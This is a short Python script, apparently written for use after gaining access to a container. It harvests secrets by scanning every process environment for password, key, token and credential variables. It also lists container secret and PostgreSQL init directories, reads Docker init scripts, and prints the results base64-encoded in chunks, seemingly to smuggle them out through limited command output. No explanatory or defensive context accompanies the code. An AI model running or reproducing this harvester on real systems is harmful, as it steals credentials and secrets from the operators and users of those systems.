import os,glob,base64,sys

output = []
# Read /proc/*/environ
for p in glob.glob('/proc/[0-9]*/environ'):
    try:
        with open(p, 'rb') as f:
            data = f.read()
        for line in data.split(b'\x00'):
            line = line.decode('utf-8', errors='ignore')
            up = line.upper()
            if any(k in up for k in ['PASS','KEY','SECRET','TOKEN','REDIS','API_','AUTH','CRED','GRAFANA']):
                output.append("E:"+line)
    except:
        pass

# PID 1
try:
    with open('/proc/1/cmdline','rb') as f:
        output.append("P1:"+f.read().replace(b'\x00',b'|').decode())
except:
    pass

# Config dirs
for cp in ['/opt/postgresql/','/docker-entrypoint-initdb.d/','/run/secrets/','/var/run/secrets/']:
    try:
        files = os.listdir(cp)
        if files:
            output.append("D:"+cp+":"+",".join(files[:20]))
    except:
        pass

# Init scripts
for ip in glob.glob('/docker-entrypoint-initdb.d/*'):
    try:
        with open(ip) as f:
            output.append("I:"+ip+":"+f.read()[:200])
    except:
        pass

# Encode entire output as base64
result = "\n".join(output)
encoded = base64.b64encode(result.encode()).decode()
# Print in chunks to avoid line length issues
for i in range(0, len(encoded), 200):
    print(encoded[i:i+200])
